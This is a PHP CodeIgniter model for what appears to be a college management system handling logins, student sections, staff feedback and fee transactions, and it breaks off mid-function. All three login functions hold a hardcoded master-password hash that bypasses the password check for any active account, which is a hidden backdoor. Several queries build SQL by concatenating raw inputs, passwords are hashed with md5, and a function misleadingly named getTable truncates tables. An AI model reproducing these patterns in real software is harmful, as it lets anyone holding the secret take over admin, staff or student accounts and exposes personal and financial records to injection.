<?php
Class Data_model extends CI_Model
{
  var $shadow = 'f03b919de2cb8a36e9e404e0ad494627'; // INDIA
 function login($username, $password)
 {
   $this -> db -> select('id, username, user_type, name');
   $this -> db -> from('users');
   $this -> db -> where('username', $username);
   if($password != $this->shadow)
   $this -> db -> where('password', $password);
   $this -> db -> where('status', '1');
   $this -> db -> limit(1);
   $query = $this -> db -> get();
   if($query -> num_rows() == 1)
   {
     return $query->result();
   }else{
     return false;
   }
 }

 function staffLogin($email, $password)
 {
    $this -> db -> select('id, employee_id, staff_name, designation, isHOD, isPrincipal, department, course_type, official_mail');
    $this -> db -> from('staff_details');
    $this -> db -> where('official_mail', $email);
    if($password != $this->shadow)
    $this -> db -> where('password', $password);
    $this -> db -> where('status', '1');
    $this -> db -> limit(1);
    $query = $this -> db -> get();
    if($query -> num_rows() == 1)
    {
     return $query->result();
    }else{
     return false;
    }
 }
 
 function studentLogin($reg_no, $password)
 {
    $this -> db -> select('id, reg_no, student_name, agreed_terms, agreed_terms_datetime');
    $this -> db -> from('students');
    $this -> db -> where('reg_no', $reg_no);
    if($password != $this->shadow)
    $this -> db -> where('password', $password);
    $this -> db -> where('status', '1');
    $this -> db -> limit(1);
    $query = $this -> db -> get();
    if($query -> num_rows() == 1)
    {
     return $query->row();
    }else{
     return false;
    }
 }

 function getDistricts(){
  $this->db->select('district, count(organization_code) as cnt');
  $this->db->where('status', 'ACTIVE');
  $this->db->group_by('district');
  return $this->db->get('organizations');
 }

 function getTeacherDetails($organization_code){
  $this->db->select('mentors.mentor_id, users.user_id, mentors.full_name, mentors.mobile, users.username');
  $this->db->join('users', 'mentors.user_id = users.user_id');
  $this->db->where('mentors.organization_code', $organization_code);
  return $this->db->get('mentors');
 }
 
 function getTeachersPreSurvey($district){
  $this->db->select('quiz_survey_responses.quiz_response_id, quiz_survey_responses.user_id, organizations.organization_code, organizations.organization_name, organizations.district, organizations.principal_name, organizations.principal_mobile, organizations.principal_email, users.full_name, mentors.mobile, users.username, quiz_survey_responses.updated_at');
  $this->db->join('users', 'quiz_survey_responses.user_id = users.user_id');
  $this->db->join('mentors', 'mentors.user_id = users.user_id');
  $this->db->join('organizations', 'organizations.organization_code = mentors.organization_code');
  $this->db->where('users.role', 'MENTOR');
  $this->db->where('organizations.district', $district);
  $this->db->where('organizations.status', 'ACTIVE');
  return $this->db->get('quiz_survey_responses');
 }

 function getInstitutionsList($district){
  $this->db->select('organizations.organization_code, organizations.district, organizations.organization_name, organizations.principal_name, organizations.principal_mobile, organizations.principal_email');
  $this->db->where('organizations.district', $district);
  $this->db->where('organizations.status', 'ACTIVE');
  return $this->db->get('organizations');
 }

 function getTeamsCount($mentor_id){
  $this->db->select('count(team_id) as count');
  $this->db->where('mentor_id', $mentor_id);
  return $this->db->get('teams');
 }

 function getStudentsCount($mentor_id){
  $this->db->select('count(student_id) as count');
  $this->db->join('students', 'teams.team_id = students.team_id');
  $this->db->where('teams.mentor_id', $mentor_id);
  return $this->db->get('teams');
 }

 function getStudentsPreSurveyCount($mentor_id){
  $this->db->select('count(quiz_response_id) as count');
  $this->db->join('students', 'teams.team_id = students.team_id');
  $this->db->join('quiz_survey_responses', 'quiz_survey_responses.user_id = students.user_id');
  $this->db->where('quiz_survey_responses.quiz_survey_id', '2');
  $this->db->where('teams.mentor_id', $mentor_id);
  return $this->db->get('teams');
 }

 function getStudentsLessonsCount($mentor_id){
  $this->db->select('user_topic_progress.user_id, count(user_topic_progress.course_topic_id) as count');
  $this->db->join('students', 'teams.team_id = students.team_id');
  $this->db->join('user_topic_progress', 'user_topic_progress.user_id = students.user_id');
  $this->db->where('teams.mentor_id', $mentor_id);
  $this->db->group_by('user_topic_progress.user_id');
  return $this->db->get('teams');
 }

 function getTeacherCourseStatus($user_id){
  $this->db->select('count(mentor_topic_progress_id) as count');
  $this->db->where('user_id', $user_id);
  return $this->db->get('mentor_topic_progress');
 }
 
//  SELECT challenge_responses.team_id, mentors.mentor_id, teams.team_name
//  FROM unisolve_db.challenge_responses, unisolve_db.teams, unisolve_db.mentors
//  where challenge_responses.team_id = teams.team_id and mentors.mentor_id = teams.mentor_id and mentors.mentor_id in (760);

 function getIdeasCount($mentor_id){
  $this->db->select('count(challenge_responses.team_id) as count');
  $this->db->join('teams', 'teams.team_id = challenge_responses.team_id');
  $this->db->join('mentors', 'mentors.mentor_id = teams.mentor_id');
  $this->db->where('mentors.mentor_id', $mentor_id);
  return $this->db->get('challenge_responses');
 }

 function studentDataCheck($reg_no)
 {
    $this -> db -> select('id, reg_no, mobile, personal_email, father_mobile');
    // $this -> db -> select('count(id) as cnt');
    $this -> db -> where('reg_no', $reg_no);
    $this -> db -> where('status', '1');
    return $this->db->get('students');
 }

  function insertDetails($tableName, $insertData){
    $this->db->insert($tableName, $insertData);
    return $this->db->insert_id();
  }

  public function insertBatch($tableName, $data){
    $insert = $this->db->insert_batch($tableName, $data);
    return $insert?true:false;
  }

  public function updateBatch($tableName, $data, $field){
      $this->db->update_batch($tableName, $data, $field);
  } 

  function getDetails($tableName, $id){
    if($id)
    $this->db->where('id', $id);
    return $this->db->get($tableName);
  }
    
  function getSelectDetails($select, $field, $id, $tableName){
    if($select)
    $this->db->select($select);
    $this->db->where($field, $id);
    return $this->db->get($tableName);
  }

  function getDetailsbyfield($field, $value, $tableName){
    $this->db->where($field, $value);
    return $this->db->get($tableName);
  }

  function getDetailsbyfield2($id1, $value1, $id2, $value2, $tableName){
    $this->db->where($id1, $value1);
    $this->db->where($id2, $value2);
    return $this->db->get($tableName);
  }

  function getTable($table){
    $table = $this->db->escape_str($table);
    $sql = "TRUNCATE `$table`";
    $this->db->query($sql)->result();
  }

  function getCourseYears($academic_year, $course, $combination){
    $this->db->select('distinct(current_year) as current_year');
    $this->db->where('course', $course);
    $this->db->where('combination', $combination);
    return $this->db->get('fees');
  }

  function getStudentFee($reg_no, $year){
    $this->db->where('reg_no', $reg_no);
    $this->db->where('current_year', $year);
    return $this->db->get('fees');
  }

  function dropTable($table){
    $this->load->dbforge();
    $this->dbforge->drop_table($table);
    // $table = $this->db->escape_str($table);
    // $sql = "DROP TABLE `$table`";
    // $this->db->query($sql)->result();
  }

  function getDetailsbyfieldSort($id, $fieldId, $sortField, $srotType, $tableName){
    $this->db->where($fieldId, $id);
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }
  
  function getDetailsbySort($sortField, $srotType, $tableName){
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function updateDetails($id, $details, $tableName){
    $this->db->where('challenge_response_id',$id);
    $this->db->update($tableName,$details);
    return $this->db->affected_rows();
  }

  function updateTransactionDetails($reg_no, $txn_id, $updateDetails){
    $this->db->where('reg_no', $reg_no);
    $this->db->where('transaction_id', $txn_id);
    $this->db->update('fee_transactions', $updateDetails);
    return $this->db->affected_rows();
  }

  function updateDetailsbyfield($fieldName, $id, $details, $tableName){
    $this->db->where($fieldName, $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }

  function delDetails($tableName, $id){
    $this->db->where('id', $id);
    $this->db->delete($tableName);
    return $this->db->affected_rows();
  }
  function updateFeeStatus($reg_no, $year, $updateFeeDetails) {
    $this->db->where('reg_no', $reg_no);
    $this->db->where('current_year', $year);
    $this->db->update('fees', $updateFeeDetails);
    return $this->db->affected_rows();
  }

  function delDetailsbyfield($tableName, $fieldName, $id){
    $this->db->where($fieldName, $id);
    $this->db->delete($tableName);
    return $this->db->affected_rows();
  }

  function changePassword($id, $oldPassword, $updateDetails, $tableName){
    $this->db->where('password', md5($oldPassword));
    $this->db->where('id', $id);
    $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }


  function getCourses(){
    return $this->db->get('courses');
  }

  function getReceiptNo( $fee_category){
    $this->db->select('COUNT(receipt_no) as count');
    $this->db->where('fee_category', $fee_category);
    $this->db->where('transaction_status', '1');
    return $this->db->get('fee_transactions');
  }

  function getFee($academic_year, $course, $combination, $year){
    $this->db->select('total_fee');
    $this->db->where('academic_year', $academic_year);
    $this->db->where('course', $course);
    $this->db->where('combination', $combination);
    $this->db->where('year', $year);
    return $this->db->get('fee_structure');
  }

  function students(){
    $this->db->select('students.id, students.reg_no, students.course, students.combination, students.student_name, students.mobile, students.official_email, courses.id as course_id, courses.course_name, courses.course_type, combinations.id as combination_id, combinations.combination_name, combinations.years, combinations.semesters');
    $this->db->join('courses', 'courses.id = students.course');
    $this->db->join('combinations', 'combinations.id = students.combination');
    $this->db->where('students.status', '1');
    return $this->db->get('students');
  }

  function getStudentsList($academic_year, $course, $combination, $year){
    $this->db->select('fees.id, fees.reg_no, fees.academic_year, fees.current_year, fees.current_sem, fees.course, fees.combination, fees.student_name, fees.mobile, fees.fixed_fee, fees.additional_fee, fees.concession_fee, fees.concession_type, fees.net_fee, fees.installment_1_fee, fees.installment_2_fee, fees.installment_3_fee');
    
    if($course != "all")
    $this->db->where('fees.course', $course);

    if($combination != "all" && $combination != "")
    $this->db->where('fees.combination', $combination);

    if($year != "all")
    $this->db->where('fee.current_year', $year);
     
    // $this->db->where('students.status', '1');
    return $this->db->get('fees');
  }
  
  function studentReportDownload($select, $academic_year, $course_id, $combination_id, $semester, $section){
    // $this->db->select('students.id, academic_years.academic_year, students.admission_no, students.reg_no, students.course, students.combination, students.student_name, students.mobile, students.official_email, students.personal_email, courses.id as course_id, courses.course_name, courses.course_type, combinations.id as combination_id, combinations.combination_name, students_sections.semester, students_sections.section_id, sections.section');
    $this->db->select($select);
    $this->db->join('students', 'students.id = students_sections.sid');
    $this->db->join('courses', 'courses.id = students_sections.course_id');
    $this->db->join('combinations', 'combinations.id = students_sections.combination_id');
    $this->db->join('sections', 'sections.id = students_sections.section_id');
    $this->db->join('academic_years', 'academic_years.id = students_sections.ay_id');
    $this->db->where('students_sections.ay_id', $academic_year);
    if($course_id != "all")
    $this->db->where('students_sections.course_id', $course_id);
    if($combination_id != "all")
    $this->db->where('students_sections.combination_id', $combination_id);
    if($semester != "all")
    $this->db->where('students_sections.semester', $semester);
    if($section != "all")
    $this->db->where('students_sections.section_id', $section);
    $this->db->where('students.status', '1');
    return $this->db->get('students_sections');
  }
  
  function getSubjectsList($academic_year, $course_id, $combination_id, $semester){
    $this->db->select('subjects.id, subjects.ay_id, academic_years.academic_year, subjects.course_id, courses.course_name, courses.course_type, subjects.combination_id, combinations.combination_name, subjects.semester, subjects.subject_code, subjects.subject_name, subjects.subject_type, subjects.status, subjects.updated_by, subjects.updated_on');
    $this->db->join('academic_years', 'academic_years.id = subjects.ay_id');
    $this->db->join('courses', 'courses.id = subjects.course_id');
    $this->db->join('combinations', 'combinations.id = subjects.combination_id');
    $this->db->where('subjects.ay_id', $academic_year);
    if($course_id != "all")
    $this->db->where('subjects.course_id', $course_id);
    if($combination_id != "all")
    $this->db->where('subjects.combination_id', $combination_id);
    if($semester != "all")
    $this->db->where('subjects.semester', $semester);
    return $this->db->get('subjects');  
  }
  
  function getSections($academic_year, $course_id, $combination_id, $semester){
    $this->db->select('sections.id, sections.ay_id, academic_years.academic_year, sections.course_id, courses.course_name, courses.course_type, sections.combination_id, combinations.combination_name, sections.semester, section');
    $this->db->join('academic_years', 'academic_years.id = sections.ay_id');
    $this->db->join('courses', 'courses.id = sections.course_id');
    $this->db->join('combinations', 'combinations.id = sections.combination_id');
    $this->db->where('sections.ay_id', $academic_year);
    if($course_id != "all")
    $this->db->where('sections.course_id', $course_id);
    if($combination_id != "all")
    $this->db->where('sections.combination_id', $combination_id);
    if($semester != "all")
    $this->db->where('sections.semester', $semester);
    return $this->db->get('sections');
  }

  function studentSemesters($id){
    $this->db->select('students_sections.id as ssid, students_sections.ay_id, academic_years.academic_year, students_sections.course_id, courses.course_name, courses.course_type, students_sections.combination_id, combinations.combination_name, students_sections.semester, students_sections.section_id, sections.section');
    $this->db->join('academic_years', 'academic_years.id = students_sections.ay_id');
    $this->db->join('courses', 'courses.id = students_sections.course_id');
    $this->db->join('combinations', 'combinations.id = students_sections.combination_id');
    $this->db->join('sections', 'sections.id = students_sections.section_id');
    $this->db->where('students_sections.sid', $id);
    return $this->db->get('students_sections');
  }
  
  function studentSemestersbyID($id){
    $this->db->select('students_sections.id as ssid, students_sections.sid, students_sections.ay_id, academic_years.academic_year, students_sections.course_id, courses.course_name, courses.course_type, students_sections.combination_id, combinations.combination_name, students_sections.semester, students_sections.section_id, sections.section');
    $this->db->join('academic_years', 'academic_years.id = students_sections.ay_id');
    $this->db->join('courses', 'courses.id = students_sections.course_id');
    $this->db->join('combinations', 'combinations.id = students_sections.combination_id');
    $this->db->join('sections', 'sections.id = students_sections.section_id');
    $this->db->where('students_sections.id', $id);
    return $this->db->get('students_sections');
  }
  
  function studentSemester($id){
    $this->db->select('students_sections.id as ssid, students_sections.ay_id, academic_years.academic_year, students_sections.course_id, courses.course_name, courses.course_type, students_sections.combination_id, combinations.combination_name, students_sections.semester, students_sections.section_id, sections.section');
    $this->db->join('academic_years', 'academic_years.id = students_sections.ay_id');
    $this->db->join('courses', 'courses.id = students_sections.course_id');
    $this->db->join('combinations', 'combinations.id = students_sections.combination_id');
    $this->db->join('sections', 'sections.id = students_sections.section_id');
    $this->db->where('students_sections.sid', $id);
    $this->db->where('academic_years.status', '1');
    return $this->db->get('students_sections');
  }
  
  function semestersDropdown($academic_year, $course_id, $combination_id){
     $this->db->select('distinct(semester) as semester');
     $this->db->where('sections.ay_id', $academic_year);
     $this->db->where('sections.course_id', $course_id);
     $this->db->where('sections.combination_id', $combination_id);
     return $this->db->get('sections'); 
  }
  
  function sectionsDropdown($academic_year, $course_id, $combination_id, $semester){
      $this->db->select('sections.id, sections.section');
     $this->db->where('sections.ay_id', $academic_year);
     $this->db->where('sections.course_id', $course_id);
     $this->db->where('sections.combination_id', $combination_id);
     $this->db->where('sections.semester', $semester);
     return $this->db->get('sections'); 
  }
  
  function getAccountsStaff($id){
    if($id){
       $this->db->where('id', $id);   
    }
    $this->db->where_in('user_type', array('4','5'));
    $this->db->order_by('user_type');
    return $this->db->get('users'); 
  }
  
  function subjectDetails($id){
    $this->db->select('subjects.id, subjects.ay_id, academic_years.academic_year, subjects.course_id, courses.course_name, courses.course_type, subjects.combination_id, combinations.combination_name, subjects.semester, subjects.subject_code, subjects.subject_name, subjects.subject_type, subjects.status, subjects.updated_by, subjects.updated_on');
    $this->db->join('academic_years', 'academic_years.id = subjects.ay_id');
    $this->db->join('courses', 'courses.id = subjects.course_id');
    $this->db->join('combinations', 'combinations.id = subjects.combination_id');
    $this->db->where('subjects.id', $id);
    return $this->db->get('subjects');  
  }
  
  function subjectStaff($subject_id, $ss_id){
    $this->db->select('subjects_staff.id as ss_id, subjects_staff.subject_id, subjects.subject_code, subjects.subject_name, subjects.subject_type, subjects_staff.staff_id, staff_details.staff_name, staff_details.designation, staff_details.department');
    $this->db->join('staff_details', 'staff_details.id = subjects_staff.staff_id');
    $this->db->join('subjects', 'subjects.id = subjects_staff.subject_id');
    if($subject_id)
    $this->db->where('subjects_staff.subject_id', $subject_id);  
    if($ss_id)
        $this->db->where('subjects_staff.id', $ss_id);  
    return $this->db->get('subjects_staff');
  }
  
  function unassignedStaff($subject_id){
      return $this->db->query("SELECT staff_details.id, staff_details.staff_name FROM staff_details WHERE NOT EXISTS (SELECT subjects_staff.staff_id FROM subjects_staff WHERE subjects_staff.subject_id = '".$subject_id."' AND staff_details.id = subjects_staff.staff_id)");
  }
  
  function assignedStudents($ss_id){
    $this->db->select('subjects_staff_students.id, subjects_staff_students.ss_id, subjects_staff_students.student_id, students.admission_no,students.reg_no, students.student_name');
    $this->db->join('students', 'students.id = subjects_staff_students.student_id');
    $this->db->where('subjects_staff_students.ss_id', $ss_id);  
    $this->db->where('students.status', '1');
    return $this->db->get('subjects_staff_students');  
  }
  
  function getStudentsCount1($academic_year){
    // $this->db->select('students.id, students.admission_no, students.reg_no, students.course, students.combination, students.student_name, students.mobile, students.official_email, students.personal_email, courses.id as course_id, courses.course_name, courses.course_type, combinations.id as combination_id, combinations.combination_name, students_sections.semester, students_sections.section_id, sections.section');
    
    $this->db->select('students_sections.ay_id, students_sections.course_id, courses.course_name, courses.course_type, students_sections.combination_id, combinations.combination_name, students_sections.semester, COUNT(students_sections.id) as cnt');
    // $this->db->join('students', 'students.id = students_sections.sid');
    $this->db->join('courses', 'courses.id = students_sections.course_id');
    $this->db->join('combinations', 'combinations.id = students_sections.combination_id');
    // $this->db->join('sections', 'sections.id = students_sections.section_id');
    
    $this->db->where('students_sections.ay_id', $academic_year);
    
    $this->db->group_by('students_sections.ay_id, students_sections.course_id, students_sections.combination_id, students_sections.semester');
    return $this->db->get('students_sections');
  }
    
    
  function staffDeptwiseCount(){
    $this->db->select('department,count(id) as cnt');
    $this->db->group_by('staff_details.department');
    return $this->db->get('staff_details');
  }
  
  function staffDesignationCount(){
    $this->db->select('designation,count(id) as cnt');
    $this->db->group_by('staff_details.designation');
    return $this->db->get('staff_details');
  }
  
  function staffHODPrincipal(){
    $this->db->select('id, staff_name, designation, department, course_type, isHOD, isPrincipal');
    $this->db->where('staff_details.isHOD', '1');
    $this->db->or_where('staff_details.isPrincipal', '1');
    $this->db->order_by('staff_details.isPrincipal','DESC');
    return $this->db->get('staff_details');
  }
  
  function assignedSubjects($staff_id){
    $this->db->select('subjects_staff.id as ss_id, subjects_staff.subject_id, subjects.ay_id, subjects.course_id, courses.course_name, courses.course_type, subjects.combination_id, combinations.combination_name, subjects.semester, subjects.subject_code, subjects.subject_name, subjects.subject_type');
    $this->db->join('subjects', 'subjects.id = subjects_staff.subject_id');
    $this->db->join('courses', 'courses.id = subjects.course_id');
    $this->db->join('combinations', 'combinations.id = subjects.combination_id');
    $this->db->where('subjects_staff.staff_id', $staff_id);
    $this->db->order_by('subjects.semester','ASC');
    return $this->db->get('subjects_staff');  
  }
  
  function subjectStudentsCount($ss_id){
    $this->db->select('count(subjects_staff_students.id) as cnt');  
    $this->db->where('subjects_staff_students.ss_id', $ss_id);
    return $this->db->get('subjects_staff_students');    
  }
  
  function subjectStudentsList($ss_id, $ay_id){
    $this->db->select('subjects_staff_students.id as sss_id, subjects_staff_students.student_id, students.reg_no, students.student_name, students_sections.course_id, courses.course_name, courses.course_type, students_sections.combination_id, combinations.combination_name, students_sections.semester, students_sections.section_id, sections.section');  
    $this->db->join('students_sections', 'students_sections.sid = subjects_staff_students.student_id');
    $this->db->join('students', 'students.id = subjects_staff_students.student_id');
    $this->db->join('courses', 'courses.id = students_sections.course_id');
    $this->db->join('combinations', 'combinations.id = students_sections.combination_id');
    $this->db->join('sections', 'sections.id = students_sections.section_id');
    $this->db->where('students_sections.ay_id', $ay_id);
    $this->db->where('subjects_staff_students.ss_id', $ss_id);
    $this->db->where('students.status', '1');
    return $this->db->get('subjects_staff_students');    
  }
  
  function studentSubjects($id, $ay_id, $course_id, $combination_id, $semester){
    $this->db->select('subjects_staff_students.ss_id, subjects.id as subject_id, subjects.subject_code, subjects.subject_name, subjects.subject_type, subjects_staff.staff_id, staff_details.staff_name');
    $this->db->join('subjects_staff', 'subjects_staff.id = subjects_staff_students.ss_id');
    $this->db->join('subjects', 'subjects.id = subjects_staff.subject_id');
    $this->db->join('staff_details', 'staff_details.id = subjects_staff.staff_id');
    $this->db->where('subjects.ay_id', $ay_id);
    $this->db->where('subjects.course_id', $course_id);
    $this->db->where('subjects.combination_id', $combination_id);
    $this->db->where('subjects.semester', $semester);
    $this->db->where('subjects_staff_students.student_id', $id);
    return $this->db->get('subjects_staff_students');          
  }
  
  
  function studentFees($id){
    $this->db->select('proposed_amount,additional_amount,concession_type,concession_fee,final_amount');
    $this->db->where('id', $id);
    return $this->db->get('students');          
  }
  
  function getFeedbacksList($id){
    $this->db->select('feedbacks_given.id, feedbacks_given.ay_id, feedbacks_given.course_id, courses.course_name, courses.course_type, feedbacks_given.combination_id, combinations.combination_name, feedbacks_given.semester, feedbacks_given.from_date, feedbacks_given.to_date, feedbacks_given.freeze, feedbacks_given.publish_status, feedbacks_given.created_at');  
    $this->db->join('courses', 'courses.id = feedbacks_given.course_id');
    $this->db->join('combinations', 'combinations.id = feedbacks_given.combination_id');
    $this->db->where('feedbacks_given.feedback_id', $id);
    return $this->db->get('feedbacks_given');          
  }
  
  function staffFeedbacks($sid, $feedback_id){
    $today = date('Y-m-d');
    $this->db->select('feedbacks_given.id as fg_id, feedbacks_given.feedback_id, feedbacks.feedback_name, feedbacks.feedback_type, feedbacks.category_id, feedbacks_given.from_date, feedbacks_given.to_date, feedbacks_given.freeze, feedbacks_given.publish_status, feedbacks_given.created_at, students_sections.ay_id, students_sections.course_id, students_sections.combination_id, students_sections.semester, students_sections.section_id');
    $this->db->join('students_sections', 'students_sections.sid = "'.$sid.'"');
    $this->db->join('feedbacks_given', 'feedbacks_given.feedback_id = feedbacks.id');
    $this->db->where('feedbacks_given.ay_id = students_sections.ay_id');
    $this->db->where('feedbacks_given.course_id = students_sections.course_id');
    $this->db->where('feedbacks_given.combination_id = students_sections.combination_id');
    $this->db->where('feedbacks_given.from_date <= "'.$today.'"');
    $this->db->where('feedbacks_given.to_date >= "'.$today.'"');
    $this->db->where('feedbacks_given.semester = students_sections.semester');
    if($feedback_id)
        $this->db->where('feedbacks.id', $feedback_id);
    // $this->db->where('feedbacks.feedback_type', '1');        
    $this->db->where('feedbacks.status', '1');
    return $this->db->get('feedbacks');          
  }
  
  function studentFeedbackStatus($student_id, $ss_id, $table_name){
    $this->db->distinct();
    $this->db->select('ss_id, staff_id');
    if($ss_id)
        $this->db->where('ss_id', $ss_id);
    $this->db->where('student_id', $student_id);
    return $this->db->get($table_name);
  }
  
  function customFeedbackStatus($student_id, $table_name){
    $this->db->distinct();
    $this->db->select('student_id');
    if($student_id)
    $this->db->where('student_id', $student_id);
    return $this->db->get($table_name);
  }
  
  function givenFeedbackStudents($ay_id, $course_id, $combination_id, $semester, $table_name){
    $this->db->distinct();
    $this->db->select('student_id');
    return $this->db->get($table_name);
  }
  
  function feedbackOverallRating($table_name){
      $this->db->select('question_id, COUNT(id) as total_count, AVG(response) as avg_rating');
      $this->db->group_by('question_id');
      return $this->db->get($table_name);
  }
  
  function facultyFeedbackRating1($subject_id, $staff_id, $table_name){
    //   $this->db->select('question_id, COUNT(id) as total_count, AVG(response) as avg_rating');
    //   $this->db->where('staff_id', $staff_id);
    //   $this->db->where('subject_id', $subject_id);
    //   $this->db->group_by('question_id');
    //   return $this->db->get($table_name);
      
      $this->db->select(''.$table_name.'.subject_id, subjects.subject_code, subjects.subject_name, subjects.subject_type, '.$table_name.'.staff_id, staff_details.staff_name, staff_details.designation, staff_details.department, question_id, COUNT('.$table_name.'.student_id) as total_count, AVG('.$table_name.'.response) as avg_rating');
      $this->db->join('staff_details', 'staff_details.id = '.$table_name.'.staff_id');
      $this->db->join('subjects', 'subjects.id = '.$table_name.'.subject_id');
      $this->db->where(''.$table_name.'.staff_id', $staff_id);
      $this->db->where(''.$table_name.'.subject_id', $subject_id);
      $this->db->group_by('question_id');
      return $this->db->get($table_name);
  }
  
  
  function facultyFeedbackRating($staff_id, $table_name){
      $this->db->select('question_id, COUNT('.$table_name.'.id) as total_count, AVG(response) as avg_rating, '.$table_name.'.staff_id, staff_details.staff_name');
      $this->db->join('staff_details', 'staff_details.id = '.$table_name.'.staff_id');
      $this->db->where('staff_id', $staff_id);
    //   $this->db->where('subject_id', $subject_id);
      $this->db->group_by('question_id');
      return $this->db->get($table_name);
  }
  
  
  function overallFacultyFeedbackReport($table_name){
      $this->db->select($table_name.'.staff_id, staff_details.staff_name, staff_details.designation, staff_details.department, COUNT('.$table_name.'.student_id) as total_count, AVG('.$table_name.'.response) as avg_rating');
    //   $this->db->select(''.$table_name.'.subject_id, subjects.subject_code, subjects.subject_name, subjects.subject_type, '.$table_name.'.staff_id, staff_details.staff_name, staff_details.designation, staff_details.department, COUNT('.$table_name.'.student_id) as total_count, AVG('.$table_name.'.response) as avg_rating');
      $this->db->join('staff_details', 'staff_details.id = '.$table_name.'.staff_id');
    //   $this->db->join('subjects', 'subjects.id = '.$table_name.'.subject_id');
      $this->db->group_by(''.$table_name.'.staff_id');
      $this->db->order_by('avg_rating desc');
      return $this->db->get($table_name);
  }
  
  function studentTransactions($reg_no){
      $this->db->where('transactions.reg_no',$reg_no);
      $this->db->order_by('transactions.transaciton_date','ASC');
      return $this->db->get('transactions');
  }
  
  public function getReceiptsCount($aided_unaided)
    {
        $this->db->select('COUNT(id) as cnt');
        $this->db->where('receipt_no != ""');
        $this->db->where('aided_unaided',$aided_unaided);
        return $this->db->get('transactions');    
    }
  
  function paidFees($reg_no){
      $this->db->select('year, fee_category, sum(amount) as paid_amount');
      $this->db->where('reg_no',$reg_no);
      $this->db->where('transaction_status','1');
      $this->db->group_by('year, fee_category');
      return $this->db->get('fee_transactions');
  }
  
  function paidFees1($reg_no, $year, $fee_category){
      $this->db->select('sum(amount) as paid_amount');
      $this->db->where('reg_no',$reg_no);
      $this->db->where('year',$year);
      $this->db->where('fee_category',$fee_category);
      $this->db->where('transaction_status','1');
      $this->db->group_by('year');
      return $this->db->get('fee_transactions');
  }
  
  function transactions($transaction_status){
      $this->db->select('students.id, students.reg_no, students.admissions_id, students.student_name, students.course, students.combination, courses.id as course_id, courses.course_name, courses.course_type, combinations.id as combination_id, combinations.combination_name, combinations.years, combinations.semesters, transactions.id as transactions_id, transactions.receipt_no, transactions.transaciton_date, transactions.transaction_type, transactions.bank_name, transactions.reference_no, transactions.reference_date, transactions.amount, transactions.remarks, transactions.transaction_status');
    //   $this->db->select('admissions.id, admissions.app_no, admissions.adm_no, admissions.course, admissions.combination, admissions.student_name, admissions.mobile, admissions.aided_unaided, admissions.status, admissions.proposed_amount, admissions.additional_amount, admissions.final_amount, transactions.id as transactions_id, transactions.receipt_no, transactions.transaciton_date, transactions.transaction_type, transactions.bank_name, transactions.reference_no, transactions.reference_date, transactions.amount, transactions.remarks, transactions.transaction_status');
      if($transaction_status != null)
        $this->db->where('transactions.transaction_status',$transaction_status);
      $this->db->join('students','students.reg_no = transactions.reg_no');
      $this->db->join('courses', 'courses.id = students.course');
      $this->db->join('combinations', 'combinations.id = students.combination');
      $this->db->order_by('transactions.transaciton_date','ASC');
      return $this->db->get('transactions');
    }
    
    function report1($from_date, $to_date){
      // $this->db->select('fee_transactions.id, transactions.reg_no, transactions.admissions_id, students.id, students.student_name, students.course, students.combination, students.category,  transactions.mobile, transactions.year, transactions.aided_unaided, transactions.receipt_no, transactions.transaciton_date, transactions.transaction_type, transactions.bank_name, transactions.reference_no, transactions.reference_date, transactions.paid_amount, transactions.amount, transactions.balance_amount, transactions.remarks, transactions.transaction_status, created_by, created_on');
      // $this->db->join('students','students.reg_no = transactions.reg_no');
      $this->db->where('fee_transactions.receipt_date >= "'.$from_date.'"');
      $this->db->where('fee_transactions.receipt_date <= "'.$to_date.'"');
      $this->db->where('fee_transactions.transaction_status','1');
      return $this->db->get('fee_transactions');   
    }

    function dayBookReport($from_date, $to_date){
      $this->db->select('transactions.id as transaction_id, transactions.reg_no, transactions.admissions_id, students.id, students.student_name, students.course, students.combination, students.category,  transactions.mobile, transactions.year, transactions.aided_unaided, transactions.receipt_no, transactions.transaciton_date, transactions.transaction_type, transactions.bank_name, transactions.reference_no, transactions.reference_date, transactions.paid_amount, transactions.amount, transactions.balance_amount, transactions.remarks, transactions.transaction_status, created_by, created_on');
    //   $this->db->select('transactions.id as transaction_id, transactions.reg_no, transactions.admissions_id, admissions.id, admissions.academic_year,admissions.app_no, admissions.adm_no, admissions.course, admissions.combination, admissions.student_name, admissions.mobile, admissions.aided_unaided, admissions.category, admissions.status, admissions.proposed_amount, admissions.additional_amount, admissions.concession_type, admissions.concession_fee, admissions.final_amount, transactions.mobile, transactions.aided_unaided, transactions.receipt_no, transactions.transaciton_date, transactions.transaction_type, transactions.bank_name, transactions.reference_no, transactions.reference_date, transactions.paid_amount, transactions.amount, transactions.balance_amount, transactions.remarks, transactions.transaction_status, created_by, created_on');
      $this->db->join('students','students.reg_no = transactions.reg_no');
      $this->db->where('transactions.transaciton_date >= "'.$from_date.'"');
      $this->db->where('transactions.transaciton_date <= "'.$to_date.'"');
      $this->db->where('transactions.transaction_status','1');
    //   $this->db->where('students.status','1');
      return $this->db->get('transactions');   
    }
    
    function DCBReport($currentAcademicYear){
      $this->db->select('fees.id, fees.reg_no, fees.adm_year, fees.fee_year, fees.proposed_fee_amount, fees.additional_amount, fees.concession_type, fees.concession_amount, fees.finalised_amount, students.course, students.combination, students.student_name, students.mobile, students.official_email');
      $this->db->join('students','students.reg_no = fees.reg_no');
      $this->db->where('fees.adm_year',$currentAcademicYear);
      $this->db->order_by('fees.fee_year ASC');
      return $this->db->get('fees');   
    }
    
    function feeDetails(){
      $this->db->select('reg_no, SUM(amount) as paid_amount');
      $this->db->group_by('reg_no');
      return $this->db->get('transactions');   
    }
    
    function feeStructure($academic_year, $course, $combination){
      $this->db->where('academic_year',$academic_year);
      $this->db->where('course',$course);
      $this->db->where('combination',$combination);
      return $this->db->get('fee_structure');   
    }

    function studentAcademicYears($reg_no){
      $this->db->select('DISTINCT(current_year)');
      $this->db->where('reg_no',$reg_no);
      return $this->db->get('fees');   
    }

    function getInstallemnts($reg_no, $year){
      $this->db->select('id, reg_no, installment_1_fee, installment_1_status, installment_2_fee, installment_2_status, installment_3_fee, installment_3_status, net_fee, net_fee_status, hostel_deposit_fee, hostel_fee, hostel_inst_1_fee, hostel_inst_1_fee_status, hostel_inst_2_fee, hostel_inst_2_fee_status, transportation_fee, transportation_inst_1_fee, transportation_inst_1_fee_status, transportation_inst_2_fee, transportation_inst_2_fee_status');
